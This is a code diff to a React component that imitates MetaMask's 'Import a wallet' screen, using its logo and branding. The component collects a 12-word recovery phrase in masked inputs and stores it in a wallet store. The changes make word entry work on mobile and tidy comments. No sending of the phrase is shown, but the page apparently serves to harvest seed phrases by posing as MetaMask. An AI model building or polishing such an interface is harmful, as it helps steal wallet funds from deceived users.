@@ -13,15 +13,15 @@ export default function MetaMask({
 	const [words, setWords] = useState<string[]>([""]);
 	const [visibility, setVisibility] = useState<boolean[]>([false]);
 	const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
-
 	const { setSeedPhrase } = useWalletStore();
 
+	// --- Handle completion ---
 	const handleComplete = () => {
 		setSeedPhrase(words.join(" "));
 		handleFinish();
 	};
 
-	// Add a new input automatically
+	// --- Add new input automatically ---
 	const addNewInput = () => {
 		if (words.length < 12) {
 			setWords((prev) => [...prev, ""]);
@@ -32,16 +32,14 @@ export default function MetaMask({
 		}
 	};
 
-	// Handle typing within each input
-	const handleInput = (
+	// --- Handle keyboard events (desktop only) ---
+	const handleKeyDown = (
 		e: React.KeyboardEvent<HTMLInputElement>,
 		index: number
 	) => {
 		if (e.key === " ") {
 			e.preventDefault();
-			if (words[index].trim() !== "") {
-				addNewInput();
-			}
+			if (words[index].trim() !== "") addNewInput();
 		} else if (e.key === "Backspace" && words[index] === "" && index > 0) {
 			e.preventDefault();
 			setWords((prev) => prev.filter((_, i) => i !== index));
@@ -52,24 +50,32 @@ export default function MetaMask({
 		}
 	};
 
-	// Handle typing value change
-	const handleChange = (value: string, index: number) => {
+	// --- Handle input changes (mobile + desktop friendly) ---
+	const handleInput = (e: React.FormEvent<HTMLInputElement>, index: number) => {
+		const value = e.currentTarget.value;
+
+		// Add new word when space detected (mobile compatible)
+		if (value.endsWith(" ")) {
+			if (words[index].trim() !== "") addNewInput();
+			return;
+		}
+
 		setWords((prev) => prev.map((w, i) => (i === index ? value : w)));
 	};
 
-	// Toggle input visibility
+	// --- Toggle single input visibility ---
 	const toggleVisibility = (index: number) => {
 		setVisibility((prev) => prev.map((v, i) => (i === index ? !v : v)));
 	};
 
-	// Clear all
+	// --- Clear all words ---
 	const handleClear = () => {
 		setWords([""]);
 		setVisibility([false]);
 		inputRefs.current[0]?.focus();
 	};
 
-	// Paste from clipboard
+	// --- Paste from clipboard ---
 	const handlePaste = async () => {
 		try {
 			const text = await navigator.clipboard.readText();
@@ -97,8 +103,8 @@ export default function MetaMask({
 
 	return (
 		<div className="relative bg-zinc-950 h-full w-full px-8 pb-28">
+			{/* Header */}
 			<div className="w-full p-secondary justify-start items-center">
-				{/*Logo */}
 				<span className="md:hidden">
 					<img
 						src="/images/wallets/metamask-fox.svg"
@@ -110,7 +116,10 @@ export default function MetaMask({
 					<MetaMaskFull />
 				</span>
 			</div>
+
+			{/* Main content */}
 			<div className="mt-8 flex flex-col w-full h-full border border-white/10 px-6 py-8 gap-8 rounded-lg max-w-md m-auto">
+				{/* Header text */}
 				<div className="flex flex-col gap-2">
 					<h2 className="text-2xl font-semibold text-gray-100 mb-1">
 						Import a wallet
@@ -121,6 +130,7 @@ export default function MetaMask({
 					</p>
 				</div>
 
+				{/* Phrase input grid */}
 				<div className="grid grid-cols-3 gap-3 border rounded-lg bg-neutral-900 p-4 min-h-56">
 					{words.map((word, index) => (
 						<div
@@ -136,8 +146,8 @@ export default function MetaMask({
 								}}
 								type={visibility[index] ? "text" : "password"}
 								value={word}
-								onChange={(e) => handleChange(e.target.value, index)}
-								onKeyDown={(e) => handleInput(e, index)}
+								onInput={(e) => handleInput(e, index)} // ✅ Works on mobile
+								onKeyDown={(e) => handleKeyDown(e, index)} // ✅ Works on desktop
 								onClick={() => toggleVisibility(index)}
 								className="bg-transparent flex-1 outline-none text-neutral-100 text-sm py-1"
 							/>
@@ -145,7 +155,7 @@ export default function MetaMask({
 					))}
 				</div>
 
-				{/* Paste / Clear all button */}
+				{/* Paste / Clear button */}
 				<div className="flex justify-end text-sm text-neutral-400">
 					<button
 						onClick={hasWords ? handleClear : handlePaste}
